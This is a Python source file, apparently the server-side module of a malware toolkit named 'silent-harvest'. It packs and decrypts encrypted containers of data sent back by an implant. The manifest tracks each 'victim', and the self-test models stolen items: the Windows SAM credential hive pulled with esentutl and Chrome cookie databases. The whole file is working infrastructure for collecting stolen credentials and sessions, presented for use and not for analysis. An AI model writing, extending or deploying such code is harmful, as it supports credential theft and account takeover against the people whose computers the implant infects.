"""silent-harvest shared container crypto (server side).

Container format (little-endian where applicable, everything else BE):

    offset  size  field
    0       4     magic  b"SHV1"
    4       2     version (u16 BE) = 1
    6       16    salt
    22      12    nonce (AES-GCM IV)
    34      8     ciphertext length (u64 BE)
    42      N     ciphertext
    42+N    16    GCM tag

    AAD  = magic || version (first 6 bytes of the container)
    key  = HKDF-SHA256(ikm=PSK, salt=salt, info=b"silent-harvest/v1", L=32)

    plaintext = u32 BE manifest_len || manifest (UTF-8 JSON) || parts blob
    manifest  = {"v":1, "victim":{...}, "parts":[{"name","off","len","meta"}]}
    part offsets are relative to the start of the parts blob.

The implant (implant/Crypto.cs) mirrors this byte-for-byte.
"""
import base64
import hashlib
import hmac
import json
import os
import struct
import time

from cryptography.exceptions import InvalidTag
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

MAGIC = b"SHV1"
VERSION = 1
INFO = b"silent-harvest/v1"
DEFAULT_PSK = b"dev-psk-change-me"  # build.bat /implant overwrites both sides


def get_psk(explicit=None):
    if explicit:
        return explicit.encode() if isinstance(explicit, str) else explicit
    env = os.environ.get("SH_PSK")
    if env:
        return env.encode()
    # psk file written next to this script by build.bat when /psk is used
    here = os.path.dirname(os.path.abspath(__file__))
    psk_file = os.path.join(here, "psk.txt")
    if os.path.exists(psk_file):
        with open(psk_file, "rb") as f:
            data = f.read().strip()
        if data:
            return data
    return DEFAULT_PSK


def hkdf_sha256(ikm, salt, info, length=32):
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm = b""
    t = b""
    counter = 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
        okm += t
        counter += 1
    return okm[:length]


def pack(parts, psk, victim_meta=None):
    """parts: list of (name, bytes, meta-dict). Returns container bytes."""
    manifest_parts = []
    blob = bytearray()
    for name, data, meta in parts:
        manifest_parts.append({
            "name": name,
            "off": len(blob),
            "len": len(data),
            "meta": meta or {},
        })
        blob += data

    if victim_meta is None:
        victim_meta = {}
    victim_meta.setdefault("ts", int(time.time()))
    manifest = json.dumps({
        "v": VERSION,
        "victim": victim_meta,
        "parts": manifest_parts,
    }, separators=(",", ":")).encode("utf-8")

    plaintext = struct.pack(">I", len(manifest)) + bytes(manifest) + bytes(blob)
    salt = os.urandom(16)
    nonce = os.urandom(12)
    key = hkdf_sha256(psk, salt, INFO, 32)
    ct = AESGCM(key).encrypt(nonce, plaintext, MAGIC + struct.pack(">H", VERSION))
    body, tag = ct[:-16], ct[-16:]
    return (MAGIC + struct.pack(">H", VERSION) + salt + nonce
            + struct.pack(">Q", len(body)) + body + tag)


def unpack(blob, psk):
    """Returns (manifest_dict, {name: bytes}). Raises ValueError on any failure."""
    if len(blob) < 58 or blob[:4] != MAGIC:
        raise ValueError("bad magic / truncated container")
    version = struct.unpack(">H", blob[4:6])[0]
    if version != VERSION:
        raise ValueError("unsupported container version %d" % version)
    salt = blob[6:22]
    nonce = blob[22:34]
    ct_len = struct.unpack(">Q", blob[34:42])[0]
    body = blob[42:42 + ct_len]
    tag = blob[42 + ct_len:42 + ct_len + 16]
    if len(tag) != 16:
        raise ValueError("truncated ciphertext/tag")
    key = hkdf_sha256(psk, salt, INFO, 32)
    try:
        plaintext = AESGCM(key).decrypt(nonce, body + tag, MAGIC + blob[4:6])
    except InvalidTag:
        raise ValueError("AEAD authentication failed (wrong PSK or corrupted data)")
    manifest_len = struct.unpack(">I", plaintext[:4])[0]
    manifest = json.loads(plaintext[4:4 + manifest_len].decode("utf-8"))
    if not isinstance(manifest, dict):
        raise ValueError("manifest is not an object")
    blob_parts = plaintext[4 + manifest_len:]
    plist = manifest.get("parts")
    if not isinstance(plist, list):
        raise ValueError("manifest missing parts list")
    parts = {}
    for p in plist:
        if not isinstance(p, dict):
            raise ValueError("malformed manifest part entry")
        try:
            name = p["name"]
            off, ln = int(p["off"]), int(p["len"])
        except (KeyError, TypeError, ValueError):
            raise ValueError("malformed manifest part entry")
        if not isinstance(name, str) or off < 0 or ln < 0 or off + ln > len(blob_parts):
            raise ValueError("part '%s' out of bounds" % name)
        parts[name] = blob_parts[off:off + ln]
    return manifest, parts


def selftest():
    parts = [
        ("sysinfo.json", b'{"host":"TESTBOX"}', {}),
        ("hive:SAM", os.urandom(1024), {"src": "esentutl"}),
        ("b:chrome/Default/Cookies", os.urandom(4096), {"path": "C:\\x\\Cookies"}),
    ]
    blob = pack(parts, b"unit-test-psk", victim_meta={"host": "TESTBOX", "user": "t"})
    manifest, out = unpack(blob, b"unit-test-psk")
    assert manifest["victim"]["host"] == "TESTBOX"
    assert out["hive:SAM"] == parts[1][1]
    assert out["b:chrome/Default/Cookies"] == parts[2][1]
    try:
        unpack(blob, b"wrong-psk")
        raise AssertionError("wrong PSK should have failed")
    except ValueError as e:
        assert "authentication failed" in str(e)
    print("shcrypto self-test OK: pack/unpack roundtrip + PSK rejection")
    # print a peek at what the wire looks like
    print("container size for 5KB of parts:", len(blob), "bytes")


if __name__ == "__main__":
    selftest()
